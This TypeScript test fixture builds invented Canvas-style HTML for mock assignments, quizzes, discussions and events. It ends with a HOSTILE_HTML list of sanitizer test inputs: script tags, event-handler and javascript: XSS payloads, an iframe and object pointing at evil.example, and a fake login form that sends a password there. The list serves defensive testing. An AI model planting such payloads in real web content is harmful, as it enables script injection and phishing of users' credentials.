// Invented HTML bodies for mock assignments, quizzes, discussions and events, shaped like what
// Canvas's rich content editor produces: headings, lists, tables, links to other Canvas pages,
// images that are Canvas files (with data-api-endpoint, like the real thing) and video embeds.

const BASE = 'https://canvas.mock';

function pick<T>(items: readonly T[], seed: number): T {
  return items[Math.abs(seed) % items.length];
}

const GOALS = [
  'apply this week’s material to a small, realistic problem',
  'practise explaining your reasoning clearly and concisely',
  'check your understanding before the next lecture',
  'build on the lab from last week',
] as const;

const READINGS = [
  ['Chapter 4: Trade-offs in practice', 'pages 112–140'],
  ['Lecture notes, week 6', 'sections 2 and 3'],
  ['The case study pack', 'cases A and C'],
] as const;

/** A Canvas file image: the src only works when logged in; the API endpoint works with a token. */
export function fileImage(courseId: string, fileId: number, alt: string) {
  return `<p><img src="${BASE}/courses/${courseId}/files/${fileId}/preview" alt="${alt}" data-api-endpoint="${BASE}/api/v1/courses/${courseId}/files/${fileId}" data-api-returntype="File" width="480" height="240" style="max-width: 100%; border: 3px solid #ff00ff;"></p>`;
}

export function workDescription(
  kind: 'assignment' | 'quiz' | 'discussion',
  name: string,
  courseId: string,
  id: number,
): string {
  const goal = pick(GOALS, id);
  const [reading, pages] = pick(READINGS, id >> 1);
  if (kind === 'quiz') {
    return [
      `<p>This quiz covers <strong>${reading}</strong> (${pages}). You have <strong>30 minutes</strong> and one attempt.</p>`,
      '<ul><li>Open book, but work on your own.</li><li>Answers are saved as you go.</li><li>Results appear once everyone has finished.</li></ul>',
    ].join('');
  }
  if (kind === 'discussion') {
    return [
      `<p>Post a short response (150–250 words) to the prompt below, then reply to <em>two</em> classmates.</p>`,
      `<blockquote><p>Which idea from ${reading} would change how you approach your own project, and why?</p></blockquote>`,
      `<p>Replies should add something new: a counter-example, a source, or a question.</p>`,
    ].join('');
  }
  const parts = [
    `<h2>Overview</h2><p>In <strong>${name}</strong> you will ${goal}. Read <a href="${BASE}/courses/${courseId}/pages/week-6-reading">${reading}</a> (${pages}) first.</p>`,
    '<h3>What to submit</h3><ol><li>Your write-up as a single PDF.</li><li>Any code or data in a zip file.</li><li>A one-paragraph reflection on what you would do differently.</li></ol>',
  ];
  if (id % 3 === 0) {
    parts.push(
      '<h3>Marking</h3><table><thead><tr><th>Criterion</th><th>Weight</th></tr></thead><tbody><tr><td>Correctness</td><td>40%</td></tr><tr><td>Clarity of explanation</td><td>35%</td></tr><tr><td>Presentation</td><td>25%</td></tr></tbody></table>',
    );
  }
  if (id % 2 === 0)
    parts.push(fileImage(courseId, 700000 + id, 'Diagram of the expected structure'));
  if (id % 5 === 0) {
    parts.push(
      '<p>Watch the walkthrough first:</p><p><iframe src="https://www.youtube.com/embed/mock-video" width="560" height="315" allowfullscreen></iframe></p>',
    );
  }
  parts.push(
    `<p>Questions? Post in the <a href="${BASE}/courses/${courseId}/discussion_topics">Q&amp;A forum</a> or see the <a href="https://example.org/style-guide">style guide</a>.</p>`,
  );
  return parts.join('');
}

export function eventDescription(title: string, location: string | null): string | null {
  if (!title) return null;
  return `<p>${location ? `Meet in <strong>${location}</strong>. ` : ''}Bring your notes from this week.</p>`;
}

/** Every trick a hostile or broken body might try; the reader must render it inert. */
export const HOSTILE_HTML = [
  '<p>Safe text before.</p>',
  '<script>window.__xss = "script"</script>',
  '<img src="x" onerror="window.__xss = \'onerror\'" alt="broken">',
  '<a href="javascript:window.__xss=\'link\'">javascript link</a>',
  '<a href="https://example.org" onclick="window.__xss=\'click\'">handler link</a>',
  '<p style="position:fixed;inset:0;z-index:9999;background:red">overlay attempt</p>',
  '<iframe src="https://evil.example/frame"></iframe>',
  '<form action="https://evil.example"><input name="password"><button>Log in</button></form>',
  '<svg><script>window.__xss="svg"</script></svg>',
  '<style>body{display:none}</style>',
  '<object data="https://evil.example/x.swf"></object>',
  '<p>Safe text after, with a <a href="/courses/1/pages/relative">relative link</a>.</p>',
].join('');
